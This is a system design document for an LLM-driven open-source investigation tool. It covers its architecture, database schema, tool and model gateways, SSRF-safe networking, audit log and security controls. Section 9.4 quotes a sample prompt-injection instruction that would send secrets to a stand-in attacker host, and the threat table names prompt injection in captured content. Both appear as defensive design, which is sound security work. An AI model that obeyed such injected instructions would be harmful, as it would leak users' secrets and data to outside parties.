# 02 — System Design

Pack 3.0 · written 2026-10-22 · status: source of truth

## 1. What this architecture optimises for (in priority order)

1. **Evidential integrity** — nothing reaches a report without a preserved source, an exact quote and a passed check.
2. **Safety by construction** — policy, scope and egress rules live in one choke point each, so no feature can bypass them.
3. **Reproducibility** — every run can be replayed from recorded inputs; every decision is in the event log.
4. **Cost control** — every paid call is estimated, reserved against a budget, and charged exactly once even after a crash.
5. **Solo maintainability** — one language, one database, one deployable, explicit module boundaries enforced by tooling.
6. **Testability** — pure core, injectable clocks, record/replay at the network and model boundaries.

When two of these conflict, the higher one wins.

## 2. Principles

1. **Deterministic harness, bounded model.** Python decides what runs, in what order, when to stop and what gets published. The model makes bounded decisions inside a step (which questions, which searches, which claims, what assessment, which words) and every output is schema-validated.
2. **Everything is a Source, a Claim or an Event.** A tool result becomes a Source. A statement becomes a Claim anchored to a quote. Everything that happens becomes an Event.
3. **One choke point per concern.** All outbound HTTP goes through the egress transport. All tool calls go through the tool gateway. All model calls go through the model gateway. All state changes go through repositories that also write events.
4. **Parse, don't validate.** Pydantic models at every boundary (tool I/O, model I/O, API I/O, files). Invalid data fails loudly and is logged.
5. **Pure core.** Scales, rules, scoring, normalisation and assessment are pure functions in `lantern.core`, property-tested and free of I/O.
6. **Untrusted by default.** Captured content is attacker-controlled data: it is never executed, never rendered in the app's origin, and never treated as instructions.
7. **One database.** Postgres holds relational data, JSONB payloads, vectors (pgvector, when needed), the event log and durable workflow state. No Redis, no graph database, no message broker at this scale.
8. **Boring where possible.** New dependencies need a reason recorded in the PLAN; agent frameworks are not used (§11).

## 3. System context

```
                ┌──────────────────────────────────────────────┐
  Investigator ─┤ CLI (M1)  ·  Web workspace (M3)  ·  Exports  │
                └───────────────────────┬──────────────────────┘
                                        │ commands / HTTP + SSE
┌───────────────────────────────────────▼──────────────────────────────────────┐
│ LANTERN (one Python codebase, modular monolith)                             │
│                                                                              │
│  runner ── durable investigation workflow (rounds, approvals, stop rules)    │
│    │                                                                         │
│  agent ─── roles: gatekeeper · planner · researcher · extractor ·            │
│    │       assessor · ACH analyst · writer · verifier                        │
│    ├────────────── model gateway (routing, structured output, cost, replay)  │
│    └────────────── tool gateway (policy, scope, provenance, budget, cache,   │
│                    limits, capture, events)                                  │
│                       │                                                      │
│                    adapters ─── egress transport (SSRF-safe, robots, caps,   │
│                                 rate limits, record/replay)                  │
│  core (pure) · policy (pure) · capture (blobs, text, WARC) · report          │
└───────┬───────────────────────────────┬──────────────────────────────┬──────┘
        │                               │                              │
┌───────▼──────────┐       ┌────────────▼────────────┐     ┌───────────▼──────────┐
│ Postgres 16      │       │ Data dir / object store │     │ External services    │
│ ledger, events,  │       │ blobs (sha256), WARC,   │     │ model providers ·    │
│ workflow state   │       │ exports                 │     │ public data sources  │
└──────────────────┘       └─────────────────────────┘     └──────────────────────┘
```

## 4. Runtime view

| Process | Started by | Does |
|---|---|---|
| `lantern` CLI | the user | creates investigations, starts runs in-process (M1) or enqueues them (M2+), approves, exports |
| `lantern worker` (M2+) | compose / service | executes durable investigation workflows and background jobs (Wayback submissions, retention) |
| `lantern api` (M3+) | compose / service | FastAPI app, SSE event stream, serves the built web app |
| Postgres 16 + pgvector | compose | all state |

M1 runs everything in the CLI process. M2 introduces the worker so runs survive the CLI exiting. M3 adds the API. The same image and code serve all three roles.

## 5. Module map

```
src/lantern/
├── config.py        Settings (pydantic-settings); grows per story               [S0.1]
├── cli.py           `lantern` entry point (argparse)                            [S0.1]
├── core/            PURE — no network, DB, model or filesystem imports
│   ├── refs.py          short refs Q/S/C/F/H/E: parse, format, allocate-next rule
│   ├── models.py        Brief, Question, SourceRecord, Claim, Finding, Hypothesis, ...
│   ├── scales.py        Reliability A–F, Credibility 1–6, Likelihood (ICD 203), Confidence
│   ├── text.py          normalisation; quote matching with offset mapping
│   ├── timeutil.py      time mentions, precision, timezone basis, earliest appearance
│   ├── independence.py  origin keys and clustering (union-find)
│   ├── assessment.py    evidence profile, confidence rules, likelihood clamp
│   ├── ach.py           ACH scoring and diagnosticity
│   ├── language.py      estimative phrases; report language lint
│   ├── identity.py      people: candidates, anchors, account attribution rules (03 §8.8)
│   └── budget.py        Budget, Spend, Reservation arithmetic
├── policy/          PURE — purpose rules, decision combination, output post-checks
├── db/              the Ledger: engine, tables, repositories, event log, Alembic   [S0.1: migrate.py, migrations/]
├── egress/          SafeTransport, IP classes, limits/breakers, robots, HTTP cassettes
├── capture/         blob store, text extraction, canonical URLs, WARC writer
├── tools/           Tool protocol, registry, gateway, adapters/
├── llm/             model gateway, provider catalogue, routing, quotas, model cassettes, prompts/
├── earth/           satellite scene search, image chips, change measurement (numpy) (P-EARTH)
├── playbooks/       YAML playbooks + loader
├── agent/           role functions + the context views they see
├── report/          Markdown/HTML/JSON renderers, evidence bundle
├── runner/          investigation workflow, approvals, durable binding
└── api/             FastAPI app (M3); demo mode: owner login, invite codes, caps (M5)
```

**Dependency rules** (enforced by `import-linter` in `make check`; a violation fails the build):

```
api | cli                       (top)
runner
agent | report
tools | llm | playbooks | earth
capture | egress | db           (mutually independent)
policy
core                            (bottom; also forbidden: httpx, sqlalchemy, asyncpg, openai, dbos, lantern.config)
```

A module may import only from layers below it. `tools/adapters/*` modules must not import each other. `policy` has the same purity restriction as `core`.

## 6. Data model (Postgres)

Every table has `id uuid primary key` and `created_at timestamptz` unless noted. Timestamps are UTC (`timestamptz`); naive datetimes are rejected at every boundary. Refs are unique per investigation.

```sql
investigations (
  ref text unique,                      -- human id, e.g. INV-2026-0042
  title text, objective text not null,
  purpose text not null,                -- journalism|research|due_diligence|security_research|professional_lookup|self_audit|other_lawful
  playbook text not null, playbook_version int not null,
  brief jsonb not null,                 -- scope (time window, places, languages, subjects), seed inputs, constraints
  mode text not null,                   -- interactive|autonomous
  policy jsonb,                         -- PolicyDecision (outcome, reasons, restrictions, attestation)
  budget jsonb not null, spent jsonb not null,
  status text not null,                 -- see §7.1
  retention_until timestamptz, hold_reason text,
  updated_at timestamptz, completed_at timestamptz)

questions (
  investigation_id fk, ref text,        -- Q1..
  parent_id uuid null, text text not null,
  kind text not null,                   -- existence|identity|attribution|temporal|spatial|authenticity|relationship|quantity|other
  priority smallint not null, status text not null,  -- open|active|blocked|answered|unanswerable|out_of_scope|dropped
  origin text not null,                 -- playbook|planner|user|follow_up
  answer_criteria text not null, attempts smallint not null default 0,
  unique (investigation_id, ref))

known_urls (                            -- URL provenance (§9.4); no id column
  investigation_id fk, url_hash text,   -- sha256 of the canonical URL; search results themselves are not stored (§8.1)
  via text not null,                    -- user|search|link|tool
  via_source_id uuid null, first_seen_at timestamptz,
  primary key (investigation_id, url_hash))

search_log (                            -- what was searched; never the results' titles or snippets
  investigation_id fk, run_id fk, tool text, query text, language text,
  result_count int, at timestamptz)

sources (
  investigation_id fk, ref text,        -- S1..
  kind text not null,                   -- web_page|news_article|social_post|api_record|registry_record|document|media|user_upload
  tool text not null, tool_version text not null, request jsonb not null,   -- request is sanitised
  url text, final_url text, canonical_url text,
  http_status int, content_type text,
  fetched_at timestamptz not null,
  published_at timestamptz, published_basis text,   -- api_record|page_metadata|http_header|text|archive_capture|unknown
  title text, author text, outlet text, language text,
  blob_sha256 text not null,            -- raw bytes in the blob store
  text text, text_sha256 text,          -- extracted, normalised text (capped)
  warc_file text, warc_record_id text,
  archive jsonb not null,               -- {local: ok|failed, wayback: {status, url, at}}
  content_reliability char(1) not null,  -- A..F for what the source says (03 §8.1)
  record_reliability char(1) not null,   -- A..F for facts about the source itself (exists, publisher, time)
  reliability_basis text not null,       -- rule id(s), or "user: <reason>" after an override
  origin_key text not null,             -- seed for independence clustering
  unique (investigation_id, ref), unique (investigation_id, blob_sha256))

claims (
  investigation_id fk, ref text,        -- C1..
  source_id fk not null,
  kind text not null,                   -- content|record
  statement text not null,              -- one atomic assertion, English
  quote text, quote_start int, quote_end int,   -- verbatim span in sources.text (content claims)
  quote_language text,
  claim_type text not null,             -- event|state|attribute|relation|quantity|statement|denial|other
  subject jsonb not null, object_text text,
  event_time_start timestamptz, event_time_end timestamptz, time_precision text,
  time_basis text,                      -- same values as sources.published_basis
  place_text text,
  attributed_to jsonb not null,         -- {kind, name}: who asserts it
  access text not null, hedging text not null, is_allegation bool not null,
  credibility smallint not null, credibility_basis text not null,   -- 1..6; 1 and 5 only by code
  origin_cluster text,                  -- computed (03 §8.4)
  extractor text not null,              -- model id + prompt id@version, or "code:<rule>"
  status text not null,                 -- active|rejected|superseded
  status_reason text,
  unique (investigation_id, ref))

claim_questions (claim_id fk, question_id fk, primary key (claim_id, question_id))

entities (investigation_id fk, ref text, type text, name text, keys jsonb, aliases text[], unique (investigation_id, ref))
mentions (claim_id fk, entity_id fk, role text, primary key (claim_id, entity_id, role))

findings (
  investigation_id fk, ref text,        -- F1.. (one ref per question; versions below)
  question_id fk, version int not null,
  kind text not null,                   -- assertion|negative_search|contested|unanswerable
  statement text not null,
  likelihood text,                      -- ICD 203 term (null for unanswerable)
  confidence text,                      -- low|moderate|high (computed)
  supporting text[] not null, contradicting text[] not null,   -- claim refs
  profile jsonb not null,               -- evidence profile computed by code
  rationale text not null,              -- model's short justification
  proposed_likelihood text,             -- before the clamp, for audit
  is_current bool not null,
  unique (investigation_id, ref, version))

hypotheses (investigation_id fk, question_id fk, ref text, statement text, status text)
ach_ratings (hypothesis_id fk, claim_id fk, rating text, note text, primary key (hypothesis_id, claim_id))  -- CC|C|N|I|II

reports (investigation_id fk, version int, status text,   -- draft|published|needs_review
  document jsonb not null,              -- sentence-structured report
  markdown text, verification jsonb, generated_by text)

runs (investigation_id fk, workflow_id text, status text, stop_reason text, started_at, finished_at)

approvals (investigation_id fk, run_id fk, kind text,   -- plan|tool_calls|budget  (attestation is not an approval: §7.1)
  payload jsonb, status text,           -- pending|approved|denied|edited
  decided_payload jsonb, decided_by text, decided_at timestamptz)

tool_calls (investigation_id fk, run_id fk, seq int, tool text, tool_version text,
  args jsonb, args_hash text, status text, error text, cached bool,
  cost_usd numeric(12,6), latency_ms int, source_ids uuid[])

llm_calls (investigation_id fk, run_id fk, role text, provider text, model text, prompt_id text, prompt_version int,
  request_hash text, input_tokens int, output_tokens int, cached_input_tokens int,
  cost_usd numeric(12,6), latency_ms int, status text)

llm_quota (provider text, model text, day date, requests int, tokens int, primary key (provider, model, day))

events (                                 -- append-only; app role has INSERT and SELECT only
  seq bigserial primary key, chain text not null,   -- investigation id, or 'system'
  at timestamptz not null, actor text not null,      -- system|agent:<role>|user:<id>
  type text not null, payload jsonb not null,
  prev_hash text not null, hash text not null,
  unique (chain, hash))
```

Indexes: `sources (investigation_id, fetched_at)`, `claims (investigation_id, source_id)`, `claims (investigation_id, event_time_start)`, `claim_questions (question_id)`, `findings (question_id) where is_current`, `events (chain, seq)`, GIN on `entities.keys`. Vector columns arrive only when a story needs them.

Reliability rules, playbooks and prompts are **files in the repository** (versioned with code), not tables.

## 7. Key flows

### 7.1 Investigation lifecycle

```
draft ──gate──▶ denied
          ├───▶ awaiting_attestation ──attest──▶ ready
          └───▶ ready ──run──▶ running ⇄ awaiting_user (approvals)
                                 ├──▶ completed   (report published)
                                 ├──▶ stopped     (budget/time/cancel; partial report published with notice)
                                 └──▶ failed      (error; best-effort report marked needs_review)
completed|stopped ──user adds questions or evidence──▶ ready
```

Attestation happens once, before any run (`lantern attest`, or the brief form in M3). It is a status, not an in-run approval.

### 7.2 One tool call

```
agent proposes ToolCall(tool, args, purpose, question_ref)
  → gateway.vet:     tool allowed by playbook? purpose/restrictions allow it? person-pivot rule?
                     side_effects == "none"? URL provenance (fetch only known URLs)?
  → duplicate check: same args_hash already succeeded in this investigation →
                     other tools return the earlier outcome (its sources);
                     search tools return "already searched (N results)" — results are never stored
  → global cache:    immutable lookups only (e.g. a registry record); never search tools
  → budget.reserve(tool.estimate(args))            refused → event + "not run: budget"
  → premium tool? approval per playbook (§7.4)
  → limiter.acquire(rate_key); breaker.check(rate_key)
  → adapter.run(args, ctx)                          all HTTP via SafeTransport
  → capture: blobs (sha256) → text extraction → SourceDraft → sources row → known_urls (links)
      (search tools instead: results go back to this step only; search_log row + known_urls hashes, §8.1)
  → budget.settle(actual) ; tool_calls row ; events: tool.called, source.captured
  → ToolOutcome(sources=[S refs] or transient results, summary for the model)
```

### 7.3 One model call

```
role function builds views (refs only) → ModelGateway.structured(role, prompt, inputs, OutputModel)
  → routing: role → tier → ordered provider:model entries (§11)
  → token estimate → budget.reserve (dollars, tokens, requests)
  → pick the first entry with quota left and a closed breaker
  → request: [system: _common + role prompt + schema] → [stable inputs] → [dynamic tail]
  → replay mode? serve cassette by request hash, else call the provider
       429 → honour Retry-After, mark busy, try the next entry; 5xx/timeout → backoff, then next entry
  → parse the whole reply as one JSON object → Pydantic OutputModel → refs validated
       invalid → one retry with the validation error appended → still invalid → SchemaFailure
  → usage → cost (0 on free tiers) → budget.settle → llm_calls + llm_quota rows → event
```

### 7.4 Approval wait

```
runner needs approval (plan review, premium tool calls, budget raise)
  → approvals row (pending) + event + status awaiting_user
  → durable wait (survives restarts)
  → user decides via CLI/API: approve | deny | edit → event → workflow resumes with the decision
autonomous mode: premium-tool and budget approvals are auto-denied and logged; plan review is skipped
```

### 7.5 Report publication

```
writer → sentence-structured draft (each sentence: text, cites[C refs], finding ref)
  → deterministic checks: factual sentences cite ≥ 1 claim; cited claims exist and are active;
                           estimative words match the finding's labels; allegation wording; protected-trait screen
  → verifier (batched): supported | partial | unsupported | not_factual
  → one repair round for partial/unsupported (writer) → re-verify
  → remaining unsupported → removed, listed in "Statements removed for lack of support"
  → render Markdown/HTML/JSON → reports row (published) → event report.published
```

## 8. Tool contract and gateway

```python
class Tool(Protocol[ArgsT]):
    name: ClassVar[str]                 # "search.web", "web.fetch", "news.gdelt", ...
    version: ClassVar[str]              # bump when output mapping changes (invalidates cassettes)
    description: ClassVar[str]          # what the model sees in the tool menu
    args_model: ClassVar[type[ArgsT]]   # Pydantic; also generates the argument schema shown to the model
    licence: ClassVar[Licence]          # commercial_ok, attribution text, terms URL, notes
    rate_key: ClassVar[str]             # limiter/breaker key ("brave", "gdelt", or per-host)
    cost_class: ClassVar[Literal["free", "metered", "premium"]]
                                        # metered (cents per call, e.g. web search): covered by the budget
                                        # premium (expensive or with side effects, e.g. X reads, TinEye,
                                        #   a public urlscan scan): approval when the playbook requires it
    side_effects: ClassVar[Literal["none"]]   # read-only; the registry rejects any other value
    def estimate(self, args: ArgsT) -> CostEstimate: ...
    async def run(self, args: ArgsT, ctx: ToolContext) -> ToolResult: ...
                                        # ToolResult: sources (SourceDrafts) + hits (transient SearchHits)
```

### 8.1 Search results are transient

Commercial search APIs generally forbid storing or caching their results (Brave's and Exa's terms say so explicitly; see `04_DATA_SOURCES.md`). So a search tool returns results **only to the current step**: the researcher sees them, chooses URLs to fetch, and the gateway records just the query, the result count (`search_log`) and hashes of the result URLs (`known_urls`, for provenance). The **evidence is what Lantern fetches itself** — the pages, with robots.txt respected, preserved and hashed. Search results never become Sources, and the reasoning never cites a search snippet.

Tools whose terms allow storage (for example GDELT with attribution, official registries, archives) produce normal Sources.

### 8.2 Adapter rules

Adapters only translate between an external API and `SourceDraft`s. They never implement budgets, caching, retries, limits, capture, events or policy — those live once in `tools/gateway.py` and `egress/`. A failing adapter can never bypass them because it has no other way to reach the network: `ToolContext` hands it the only HTTP client.

Gateway guarantees, each tested once in the gateway and never re-tested per adapter: policy and scope vetting; read-only tools only; URL provenance; duplicate suppression by `args_hash` and a global cache for immutable lookups (never for search tools, §8.1); budget reserve/settle; premium-tool approval; token-bucket limits and circuit breakers per `rate_key` (open after 5 consecutive failures, half-open after cooldown); retries with jittered backoff for 429/5xx/timeouts only; capture of every response; one `tool_calls` row and events per call; structured log line (`tool, version, args_hash, status, latency_ms, cost_usd, source_count, cached`).

## 9. Egress

### 9.1 SafeTransport

An `httpx.AsyncBaseTransport` used by every adapter. For each request and each redirect hop:

1. Scheme must be `https` or `http`; port in an allow-list (80, 443, 8080, 8443 by default).
2. Resolve the host (all A/AAAA records). Reject if **any** address is not globally routable: private (RFC 1918, fc00::/7), loopback, link-local (incl. 169.254.0.0/16 and fe80::/10), CGNAT 100.64.0.0/10, multicast, unspecified, reserved, documentation ranges, IPv4-mapped/embedded IPv6 forms of the above, and cloud metadata addresses (169.254.169.254, fd00:ec2::254).
3. **Pin**: connect to the validated IP while sending the original `Host` header and using the original hostname for TLS SNI and certificate checks. A second DNS answer cannot change the target (defeats DNS rebinding).
4. Redirects are followed manually (max 5), each hop re-validated from step 1.
5. Caps: connect 5 s, read 20 s, total 45 s; body streamed and aborted beyond the per-tool size limit (default 10 MB).
6. Every request carries the product User-Agent with a contact URL (`Lantern/<version> (+<contact>)`), configured in settings.

IP classification is a pure function in `egress/ipclass.py` with property tests (every address in a blocked network is blocked; integer, hex and dotted-octal IPv4 spellings normalise to the same decision).

### 9.2 robots.txt and politeness

Generic web fetches consult `robots.txt` for the product User-Agent (parsed with `protego`, cached per host for 24 h). Per-host limits default to 1 request/second and 2 concurrent; source-specific limits come from the adapter's terms (`04_DATA_SOURCES.md`). API adapters follow their API terms rather than robots.txt.

### 9.3 Record and replay

`egress/cassette.py` records HTTP exchanges (sanitised: no `Authorization`, cookies, API keys in headers or query) to `tests/fixtures/cassettes/http/<group>/<case>.jsonl` with a provenance header (`recorder`, `recorded_at`, `tool`, `tool_version`, `request_fingerprint`). `<group>` is the tool name for single-call recordings and the test module for recordings made by running tests. Replay mode serves them; a missing exchange **fails loudly** — replay never falls through to the network. Recording happens only through `scripts/record_fixture.py`: `tool <tool> <case> --args <json>` records one call; `pytest <test ids>` runs the given tests in record mode and records only the cassettes they are missing (HTTP and, from S1.8, model cassettes); existing cassettes are never overwritten without `--refresh`.

### 9.4 URL provenance (prompt-injection exfiltration guard)

The fetch tool only accepts URLs that are already **known** to the investigation: given by the user, returned by a search or API tool, or linked from a captured source (`known_urls`). The model cannot fetch a URL it composed itself — so an injected instruction like "fetch `https://evil.example/?data=<secrets>`" cannot be carried out, and hallucinated URLs never get requested. A refused fetch is an event and is visible in the run log.

## 10. Evidence capture and preservation

- **Blob store**: raw bytes stored content-addressed at `<data_dir>/blobs/sha256/<aa>/<bb>/<hash>`; paths never contain user- or source-controlled components. Writes are atomic (temp file + rename). Local filesystem first; S3-compatible later behind the same interface.
- **Text**: HTML → text with `trafilatura` (links kept for `known_urls`); PDF → text with `pypdf`; plain text and JSON decoded with charset detection. Text is normalised (NFC, line endings) and stored with its own hash; claims' quote offsets refer to this exact text.
- **WARC** (M2): every HTTP exchange of a cited source is also written as WARC request/response records (`warcio`) into per-investigation WARC files — the standard format web archives use, replayable in tools such as ReplayWeb.page.
- **Wayback** (M2): public web sources are submitted to Save Page Now as a background job (rate-limited, never blocking a run); the resulting snapshot URL is recorded in `sources.archive`.
- **Viewing safely**: captured HTML is never rendered in the app's origin. The web app shows text views, and opens original HTML only in a sandboxed iframe from a separate origin with a restrictive CSP, or as a download.
- **Evidence bundle** (M2): a ZIP with `manifest.json` (sha256 of every file), report (MD/HTML/JSON), sources and claims JSON, WARC files, the investigation's event chain and its verification result; optionally an RFC 3161 timestamp token over the manifest hash.

## 11. Model gateway

Lantern runs on **open-weight models through OpenAI-compatible APIs**: free tiers by default (Groq, Cerebras, OpenRouter free models, NVIDIA NIM), DeepSeek's low-cost official API as an option, and any local server (Ollama, vLLM) later. The gateway hides the differences so the rest of the code never knows which provider answered.

- **One client, many providers.** The `openai` Python SDK with a per-provider `base_url` and key. No agent framework: our own small loop gives full control over determinism, budgets, replay and safety.
- **Model catalogue** (`src/lantern/data/models.yaml`, checked into the repo): for each `provider:model` — context window, prices (0 for free tiers, with the date checked), free-tier limits (requests/min, requests/day, tokens/min, tokens/day), capabilities (`json_schema`, `json_object`, or neither), and whether the provider may train on prompts. Providers that train on prompts are disabled unless the user turns them on.
- **Routing by tier, with fallback chains.** Each role maps to a tier (`fast`, `standard`, `strong`; `03_AGENT_DESIGN.md` §5). Each tier is an ordered list of `provider:model` entries in configuration. The gateway picks the first entry that has quota left and no open circuit breaker; on 429 it honours `Retry-After`, marks that entry busy, and moves to the next. If every entry is exhausted, the step waits (bounded) or the run soft-stops with "Stopped early: free model quota used up for today".
- **Quota tracking.** Requests and tokens per provider per day are counted in the database (`llm_quota`), so limits hold across runs and restarts. Free-tier limits are configured, never guessed; S1.8 verifies them.
- **Structured output for every role, including actions.** Every model call returns one JSON object validated by a Pydantic model. The gateway uses the strongest mechanism the entry supports: `response_format: json_schema` (strict) → `json_object` with the schema in the prompt → plain completion with the schema in the prompt. The whole reply must parse as exactly one JSON object; anything else is a schema failure. Researcher actions are structured output too (`{"calls": [{"tool": …, "args": {…}}], "done": …}`), and each call's `args` is validated against that tool's `args_model` — so Lantern does not depend on provider-specific function calling.
- **Schemas stay simple**: flat, required fields with explicit sentinels (`""`, `"unknown"`), no recursion, short enums — weaker models follow them more reliably.
- **Single-turn, stateless steps.** No conversation is continued; each step is a fresh call with fresh views (bounded context, replayable, provider-independent).
- **Prompt layout for prefix caching.** Stable parts first (shared rules, role prompt, tool menu), then stable per-question inputs, then the dynamic tail. Providers with automatic prefix caching (DeepSeek and others) get cheaper and faster; providers without it are unaffected.
- **Cost and usage.** Computed from the catalogue prices and the response's `usage` (cached and uncached input where reported, output). Free entries cost $0 but still count tokens and requests. Every call records provider, model, tokens, latency and cost in `llm_calls`.
- **Replay.** Cassettes under `tests/fixtures/cassettes/llm/<group>/<request_hash>.json`, recorded with `scripts/record_fixture.py pytest <test ids>` (§9.3). The hash covers the *role*, prompt id and version, the messages and the output schema — not the provider — so a recording replays no matter which provider answered. Changing a prompt changes the hash, so stale cassettes fail loudly.
- **Failures.** 429/5xx/timeouts → backoff and fallback (bounded); schema-invalid → one retry with the validation error → `SchemaFailure`; refusal or empty output → step failure with the reason recorded. Never partial parsing.
- **Data sent to providers.** Briefs and captured public text go to the chosen provider. The settings page and the method section of every report show which providers and models were used.

## 12. Durable runs (M2)

Requirements: (1) a crash or restart resumes the run without repeating any completed tool or model call; (2) runs can wait hours for an approval without holding a process; (3) cancellation is clean; (4) at most N concurrent runs per worker; (5) background jobs (Wayback submissions, retention) share the mechanism.

Design: the investigation loop is a **workflow** whose every side effect (tool call, model call, clock read, random choice) happens inside a **step** whose result is checkpointed in Postgres. On recovery the workflow function re-executes from the top; completed steps return their stored results instantly. Workflow code must therefore be deterministic outside steps — a rule checked in review and by a replay test that runs every golden investigation twice and compares event sequences.

Implementation: **DBOS Transact** (a Postgres-backed durable-workflow library — no extra server; MIT; async workflows and steps; durable `send`/`recv` for approvals; queues with concurrency and rate limits; version 3.x, whose 3.0 release on 2026-09-16 changed APIs, so follow current docs rather than older tutorials), behind a thin `runner/durable.py` binding so the loop itself stays framework-free and unit-testable with an in-memory executor. Story S2.1 starts with a time-boxed spike that must prove: async steps, recovery after a killed worker, durable approval waits, cancellation, in the codespace and in CI. If any fails, the fallback is a ~200-line memoised-step runner on our own `steps` table plus a `FOR UPDATE SKIP LOCKED` job table — same interface, same tests. See D8 in `09_DECISIONS.md`.

M1 runs the same loop in-process without durability.

## 13. Budgets and cost accounting

`Budget = {usd, tool_calls, llm_tokens, wall_seconds}`; defaults US$2.00, 150 tool calls, 3 M tokens, 20 minutes (configurable per investigation and per playbook).

- **Reserve → settle.** Before a paid action the gateway reserves its estimate (row lock on the investigation's spend); afterwards it settles the actual amount. Parallel steps therefore cannot overspend through reservations. If a provider bills more than its reservation, the excess is recorded as an overspend event; once spend reaches the budget in any dimension, every further reservation fails.
- **Soft stop at 85%** of any dimension: no new research; the run moves to assessment and reporting, which have a reserved share (default 15%) so a report is always produced.
- **Hard stop at 100%**: any further reservation is refused with `BudgetExceeded`; the report states "Stopped early: budget".
- Spend is shown live and in the report's method section; every cent is traceable to a `tool_calls` or `llm_calls` row.

## 14. Event log and audit

- One **hash chain per investigation**, plus a `system` chain. `hash = sha256(prev_hash ‖ canonical_json(event without hash))`; genesis `prev_hash` is 64 zeros; canonical JSON = sorted keys, UTF-8, no insignificant whitespace.
- Written in the **same transaction** as the state change it records (repositories write both).
- The application's database role has `INSERT` and `SELECT` on `events`, no `UPDATE`/`DELETE`; a test connects with that role to prove it.
- `lantern events verify <investigation>` recomputes the chain and reports the first broken link.
- **Deletion** is the only exception to append-only, and it never runs as the application role. A `SECURITY DEFINER` function owned by a separate maintenance role deletes, in **one transaction**, every row of an investigation — its event chain included — and appends a receipt to the `system` chain (investigation id, final chain head hash, row counts, reason). The job then removes blobs and WARC files that no other investigation references; a failed file removal is logged and retried. You can prove what was deleted and when without keeping the content.

Event types (initial): `investigation.created`, `policy.decided`, `attestation.recorded`, `run.started|stopped|finished`, `question.created|updated`, `tool.called|refused`, `llm.called`, `source.captured`, `claim.extracted|dropped|rejected`, `source.reliability_changed`, `finding.updated`, `approval.requested|decided`, `report.drafted|verified|published`, `budget.soft_stop|exceeded`, `export.created`, `data.deleted`.

## 15. Configuration and secrets

- `Settings` (pydantic-settings, prefix `LANTERN_`) is the only place configuration is read; it reads environment variables (Codespaces secrets) and an optional local `.env`. Secrets are `SecretStr`; their values never appear in logs, events, prompts or exceptions.
- Secrets come from Codespaces secrets (environment variables). A local `.env` is optional, git-ignored and never holds real keys in the repository; `.env.example` lists every variable with placeholders. The agent never prints secret values.
- Each adapter declares which settings it needs; missing keys disable that adapter with a clear message instead of failing at call time.
- Logging uses `structlog` JSON with a redaction processor (API keys, tokens, emails, phone numbers).

## 16. Interfaces

**CLI**: M1 — `lantern run "<objective>" --purpose <p> [--playbook <id>] [--budget-usd 2] [--autonomous]`, `lantern status <inv>`, `lantern show <inv> [questions|sources|claims|findings]`, `lantern report <inv> [--format md|html|json]`. M2 adds `worker`, `resume`, `approve`, `deny`, `attest`, `cancel`, `add-source`, `events verify`, `export --bundle`, `bundle verify`, `hold`, `delete`. Dev: `lantern db upgrade` (S0.1).

**API** (M3, FastAPI, `/api/v1`; on your machine or codespace it listens on localhost only and needs no login; the M5 demo adds an owner login and visitor invite codes, §19): investigations (create, list, get), runs (start, cancel), approvals (list, decide), questions (list, add, edit), sources (list, get, text, safe snapshot), claims (list, reject/restore), findings, reports (get, render), exports, `GET /investigations/{id}/events` (SSE), `GET /health`.

**Web** (M3): React + TypeScript + Vite, TanStack Query, Tailwind; types generated from the OpenAPI schema. Screens: investigations list; new brief (purpose, policy result, attestation); live run (questions board, activity, approvals, spend); report (citation cards with quote-in-context and archive links); evidence (sources with ratings and origin clusters, claims with accept/reject); timeline; ACH matrix; exports.

## 17. Security architecture

| Threat | Control | Proof |
|---|---|---|
| SSRF via fetched or redirected URLs | SafeTransport (§9.1) | property tests on IP classes; rebinding, redirect-to-metadata, IPv6 and odd-IPv4-spelling tests |
| Prompt injection in captured content | untrusted-content wrapping; refs-only outputs; URL provenance; read-only tools; schema validation; policy vetting of every action | injection canaries in eval worlds (`03` §12) |
| Data exfiltration through tool arguments | URL provenance; search queries logged; no tool can send captured content anywhere | gateway tests |
| Secrets leakage | env-only secrets (Codespaces secrets); `SecretStr`; log redaction; sanitised cassettes; detect-secrets in pre-commit | redaction tests; cassette scanner |
| XSS from captured HTML | never rendered in app origin; sandboxed iframe from a separate origin; output escaping in reports | renderer tests |
| Malicious files (PDF, images, archives) | size caps; parsing with time limits; no shell; decompression-bomb limits | adversarial file tests |
| Tampering with history | hash-chained events; DB role without UPDATE/DELETE | chain verification and role tests |
| Supply chain | `uv.lock`; `pip-audit`; pinned CI actions; minimal dependencies | CI |
| Abuse of the product | purpose gate, person-pivot rule, post-checks, minors stop (`07`) | policy tests and eval cases |
| Abuse of the public demo | invite codes; restricted playbooks for visitors (no `person_lookup`); per-visitor and global daily caps; rate-limited login; 7-day retention for visitor investigations | demo-mode tests (O-DEMO stories) |

## 18. Observability

- Structured JSON logs (`structlog`) with `investigation`, `run`, `step`, `role`/`tool`, `latency_ms`, `cost_usd`.
- The event log is the trace: `lantern show <inv> events` (M2) and the web activity view (M3) render it.
- Cost and token dashboards from `llm_calls`/`tool_calls` (M3). OpenTelemetry export only if ever needed.

## 19. Deployment

- **Development (M0 onwards)**: inside a GitHub Codespace. `docker compose up db` + `uv run lantern ...`; data under `./var/` (git-ignored) or `LANTERN_DATA_DIR`. API keys come from Codespaces secrets as environment variables.
- **M2–M3**: the same compose file also runs `worker` and `api` (which serves the web build); Codespaces forwards the port privately to your browser.
- **Public demo (M5, O-DEMO)**: one Oracle Cloud Always Free ARM VM running the compose stack behind Caddy (automatic HTTPS) on a free subdomain. Demo mode:
  - **Owner login** (password + TOTP) gives the full product.
  - **Visitors** enter an invite code. They can browse a gallery of recorded investigations that replay instantly and cost nothing, and start a few live ones under hard caps (per visitor per day and in total per day).
  - Visitors get the playbooks `research`, `verify_claim`, `reconstruct_event`, `area_change`, `domain_profile`, `org_due_diligence` and `public_figure_profile`; never `person_lookup` or `self_audit`.
  - Visitor investigations are deleted after 7 days.
- **Static showcase (M5)**: published reports (self-contained HTML) on GitHub Pages, linked from the README.
- **Backups (O-BACKUP)**: nightly `pg_dump` plus a copy of the data folder to private cloud storage; restore drill tested.
- Some public data sources block large cloud providers' IP ranges; adapters report this plainly instead of failing silently.

## 20. Technology stack

| Concern | Choice | Notes |
|---|---|---|
| Language | Python 3.12 | S0.1; upgrade later only via a decision record |
| Packaging and tools | uv, ruff, mypy (strict), pytest, hypothesis, pre-commit, bandit, pip-audit, import-linter | S0.1 (import-linter, bandit, pip-audit: S0.2) |
| Validation | Pydantic v2, pydantic-settings | |
| HTTP | httpx (async) with SafeTransport; respx in tests | |
| Database | Postgres 16 + pgvector image, SQLAlchemy 2 (async, asyncpg), Alembic | S0.1 |
